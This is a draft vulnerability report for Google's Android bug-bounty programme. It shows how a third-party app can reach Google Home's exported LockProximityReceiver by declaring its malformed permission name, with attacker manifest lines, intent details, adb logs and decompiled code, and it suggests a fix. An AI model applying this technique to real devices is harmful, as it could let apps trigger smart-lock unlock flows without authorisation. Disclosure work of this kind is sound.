# Submission draft — Google Home: exported receiver guarded by a permission that cannot exist

Paste target: https://bughunters.google.com/report (Android / Mobile VRP)
Status: DRAFT. Two items still missing before sending — see the bottom.

---

**Title:**
Google Home: `LockProximityReceiver` is exported and guarded by a malformed
permission string, so any app can claim that name and trigger it

---

Testing date: 2026-10-21
Testing time: 11:44 UTC
Researcher IP: 180.148.212.54
Device: moto g stylus 5G (2024), Android 15 (API 35), stock, not rooted, no developer
hacks beyond USB debugging
App: com.google.android.apps.chromecast.app (Google Home), version as installed from
Play Store on 2026-10-21
Tools: adb 35.x, jadx, aapt2, apksigner — plain AOSP build chain, no frameworks

---

## What I found

Google Home's manifest declares this receiver:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver"
    android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"/>
    </intent-filter>
</receiver>
```

`android:permission` takes one permission name. There are two here, joined with `|`.
Android does not split on `|` — it treats the whole string as a single permission name,
and nothing on the device defines a permission called
`android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN`.

That breaks the guard in both directions:

1. No legitimate caller can hold it either, so the intended protection never applies to
   anyone.
2. Because no package defines that name, any third-party app can declare it itself at
   `protectionLevel="normal"`, request it, and be granted it at install with no user
   prompt. That app then becomes the only party on the device able to reach the receiver.

I verified both halves on a stock device.

## Reproduction

I built two APKs from identical source. The only difference is that one declares and
requests the malformed permission name and the other declares nothing at all. Both send
the same broadcast.

Attacker APK manifest, the only relevant lines:

```xml
<permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
            android:protectionLevel="normal" />
<uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />
```

Both apps run the same code: build an `Intent` with action
`com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED`, set the
component to the receiver, attach `hgs_device_id`, `device_name`, `request_id` and a
one-element `ArrayList<ScanResult>` under
`android.bluetooth.le.extra.LIST_SCAN_RESULT`, then `sendBroadcast(intent)`.

The permission is granted at install without any prompt:

```
$ adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
    install permissions:
      android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN: granted=true
```

**Attacker app (declares the permission):**

```
$ adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
$ adb logcat -d | grep -iE 'MVRP|LockProximity'
10-21 17:44:33.718 31371 31371 I MVRP    : BLESCAN -> com.google.android.apps.chromecast.app/com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver  name=MVRP CANARY LOCK hgs=MVRP-CANARY-ID
10-21 17:44:33.727 31371 31371 I MVRP    : sendBroadcast() returned, no exception
10-21 17:44:34.493  6860 31439 W HomeApp|LockProximityNotificationWorker: Device not found
```

pid 6860 is Google Home. Its own `LockProximityNotificationWorker` ran, on data I
supplied, logging `Device not found` because the device id I passed is not on my account.

**Control app (identical code, declares nothing):**

```
$ adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity --es action blescan
$ adb logcat -d | grep -iE 'MVRP|LockProximity'
10-21 17:45:14.188 31653 31653 I MVRP    : self   pkg=com.cindrasec.mvrpctl uid=10569
10-21 17:45:14.191 31653 31653 I MVRP    : ScanResult built (ScanRecord=null)
10-21 17:45:14.191 31653 31653 I MVRP    : BLESCAN -> com.google.android.apps.chromecast.app/...LockProximityReceiver  name=MVRP CANARY LOCK hgs=MVRP-CANARY-ID
10-21 17:45:14.191 31653 31653 I MVRP    : sendBroadcast() returned, no exception
```

No `HomeApp|LockProximityNotificationWorker` line. Broadcasts to a component the sender
cannot reach fail silently, so the absence of Google Home's own log line is the result.
Declaring the permission name is the only variable between the two runs.

## What the receiver does with what I send

From the decompiled `onReceive`, every value comes straight out of the intent with no
caller check of any kind:

```java
if (btoy.f("...action.BLE_SCANNED", intent.getAction())) {
    ...
    if (intent.hasExtra("android.bluetooth.le.extra.LIST_SCAN_RESULT")
        && (parcelableArrayListExtra = intent.getParcelableArrayListExtra(...)) != null
        && !parcelableArrayListExtra.isEmpty()) {
        String hgsId  = intent.getStringExtra("hgs_device_id");
        String name   = intent.getStringExtra("device_name");
        int requestId = intent.getIntExtra("request_id", 0);
        ...
        juz.k(context).i("tln_send_unlock_notification_worker", 3, work);
    }
}
```

`LockProximityNotificationWorker` then resolves `hgs_device_id` against the signed-in
account. My canary id did not resolve, which is the `Device not found` above. Reading the
code further, when the id does resolve to a device with a lock trait, the worker posts a
notification on channel `tln_unlock_notification_channel_id` whose tap target is
`LockProximityUnlockActivity` with `hgs_device_id`, `request_id` and `manufacturer_data`
carried through from my broadcast, and that activity enqueues
`LockProximityUnlockWorker`, whose body is the unlock call.

I want to be precise about the limits of what I showed: I did not post that notification
and I did not unlock anything. I do not have a smart lock on the account used for
testing, and the account check is server side, so I could not supply a resolving device
id. `LockProximityUnlockActivity` is `android:exported="false"`, so the unlock cannot be
reached directly and would need the user to tap the notification.

What I did demonstrate is that an app holding no real permissions reaches a receiver you
intended to protect, and that Google Home executes a worker on the data that app supplies.

## Impact

An unprivileged app installed by the user can invoke an internal Google Home component
that your manifest intends to restrict, and cause the app to run code and perform an
account-scoped server lookup with an attacker-chosen device identifier.

The same entry point is the one that feeds the proximity-unlock notification path, so the
guard is doing no work on a path that ends at a physical lock.

Separately, the feature itself is likely broken in production: the system's BLE scan
delivery cannot hold that permission name either, so legitimate scan results should also
be refused.

## Suggested fix

Replace the single malformed attribute value with one real permission name, or remove
`android:permission` and verify the caller inside `onReceive`. If the intent was "either
BLUETOOTH or BLUETOOTH_ADMIN", note that `android:permission` cannot express a
disjunction, so that check has to live in code.

I would also suggest grepping the rest of the Android codebase for
`android:permission` values containing `|`, since this is the kind of typo that is easy
to repeat and impossible to spot at runtime — it fails closed and looks like it works.

---

## Before sending — still missing

1. **Terminal screenshot.** REPORTING-STANDARDS requires at least one screenshot of the
   real terminal showing the two runs. Take it with both commands and their output on
   screen.
2. **Re-check the version string.** Record the exact Google Home version from
   `adb shell dumpsys package com.google.android.apps.chromecast.app | grep versionName`
   and put it in the metadata block.

Do not add a CVSS score argued upward, and do not describe the unlock as something that
was performed. The strength here is that every claim has a log line behind it.
